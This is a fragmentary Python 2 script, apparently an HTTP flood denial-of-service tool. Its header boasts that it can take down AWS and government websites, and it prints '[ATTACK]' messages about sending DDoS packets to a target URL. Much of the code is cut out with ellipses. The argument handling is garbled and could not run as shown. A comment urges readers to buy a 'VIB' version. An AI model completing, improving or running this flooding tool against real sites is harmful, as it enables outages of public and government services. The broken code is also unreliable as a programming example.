...
# This tool can tangodown AWS and more gov websites ...
# 
#
# author : kira_Gp , version 1.1
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def set_safe():
        global safe
        safe=1
#The Script is not half for prossing Try To buy The VIB script
...
def usage():
        print '---------------------------------------------------'
        print 'USAGE: python deamn-force.py <url>'
...
def httpcall(url):
        ...
        request.add_header('Accept-Charset', 'br, zip,ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        ...
        try:
                        ...
                        #print e.code
                        set_flag(1)
                        print '[ATTACK]-Sending requests with packets recording '
                        code=500
...
if len(sys.argv) < 2:
        ...
        if sys.argv[1]=="help":
                ...
                print "[ATTACK]-Sending WebSite http/https server With packets By DDoS Attacks"
                if len(sys.argv)== 3:
                        if sys.argv[2]=="safe":
                                set_safe()
                url = sys.argv[1]
